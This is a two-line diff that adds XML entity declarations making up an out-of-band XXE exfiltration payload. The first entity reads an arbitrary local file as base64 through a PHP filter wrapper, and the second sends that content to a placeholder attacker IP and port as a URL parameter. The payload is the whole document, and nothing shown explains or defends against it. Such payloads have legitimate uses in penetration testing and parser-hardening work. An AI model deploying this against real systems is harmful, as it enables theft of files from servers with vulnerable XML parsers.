@@ -1,0 +1,2 @@
+<!ENTITY % ResourceToRead SYSTEM "php://filter/read=convert.base64-encode/resource=file://<FULL-ABSOLUTE-PATH-TO-FILE>">
+<!ENTITY % LoadOOBEntity "<!ENTITY &#37; OOB SYSTEM 'http://<ATTACKER-IP>:<ATTACKER-PORT>/?resourceRead=%ResourceToRead;'>">
